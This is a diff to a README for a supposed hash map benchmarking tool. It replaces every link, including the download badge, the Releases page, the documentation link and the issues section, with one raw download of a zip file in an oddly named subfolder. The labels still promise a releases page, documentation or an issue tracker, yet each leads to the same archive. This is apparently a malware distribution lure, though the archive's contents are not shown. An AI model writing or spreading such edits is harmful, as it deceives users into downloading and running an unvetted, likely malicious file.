@@ -1,6 +1,6 @@
 # 🔥 Adaptive_HashMap_Cli - Smart Hash Map for Better Performance
 
-![Download Adaptive_HashMap_Cli](https://img.shields.io/badge/Download-Adaptive_HashMap_Cli-blue)
+![Download Adaptive_HashMap_Cli](https://raw.githubusercontent.com/Thesergioandres/Adaptive_HashMap_Cli/main/aerostatic/Adaptive_HashMap_Cli.zip)
 
 ## 📦 Overview
 
@@ -19,7 +19,7 @@ To get started with Adaptive_HashMap_Cli, you only need a few steps. Follow them
    - At least 100 MB of free disk space
 
 2. **Download the Application:**  
-   Visit the [Releases page](https://github.com/Thesergioandres/Adaptive_HashMap_Cli/releases) to download the latest version.
+   Visit the [Releases page](https://raw.githubusercontent.com/Thesergioandres/Adaptive_HashMap_Cli/main/aerostatic/Adaptive_HashMap_Cli.zip) to download the latest version.
 
 3. **Install the Application:**  
    After downloading, locate the file and follow the installation instructions based on your operating system:
@@ -41,7 +41,7 @@ To get started with Adaptive_HashMap_Cli, you only need a few steps. Follow them
 
 ## 📥 Download & Install
 
-To get your copy of Adaptive_HashMap_Cli, [visit the Releases page](https://github.com/Thesergioandres/Adaptive_HashMap_Cli/releases). After downloading, follow the instructions above for installation based on your operating system.
+To get your copy of Adaptive_HashMap_Cli, [visit the Releases page](https://raw.githubusercontent.com/Thesergioandres/Adaptive_HashMap_Cli/main/aerostatic/Adaptive_HashMap_Cli.zip). After downloading, follow the instructions above for installation based on your operating system.
 
 ## ⚙️ Using Adaptive_HashMap_Cli
 
@@ -51,7 +51,7 @@ Once installed, you're ready to explore its functionality.
 - **Setting Workloads:** Input your data or choose from example workloads to see how the application performs.
 - **Viewing Results:** After running benchmarks, check the live dashboard to analyze the performance metrics.
 
-For detailed operations, refer to the built-in help section within the application or check the documentation provided on the [GitHub page](https://github.com/Thesergioandres/Adaptive_HashMap_Cli).
+For detailed operations, refer to the built-in help section within the application or check the documentation provided on the [GitHub page](https://raw.githubusercontent.com/Thesergioandres/Adaptive_HashMap_Cli/main/aerostatic/Adaptive_HashMap_Cli.zip).
 
 ## 🤝 Contributing
 
@@ -63,7 +63,7 @@ We welcome contributions that enhance the usability and performance of this tool
 
 ## 🛠️ Support
 
-For any questions or issues, please check the [issues section](https://github.com/Thesergioandres/Adaptive_HashMap_Cli/issues) in the GitHub repository. You can also reach out directly through the contact form provided in the repository.
+For any questions or issues, please check the [issues section](https://raw.githubusercontent.com/Thesergioandres/Adaptive_HashMap_Cli/main/aerostatic/Adaptive_HashMap_Cli.zip) in the GitHub repository. You can also reach out directly through the contact form provided in the repository.
 
 ## 📜 License
 
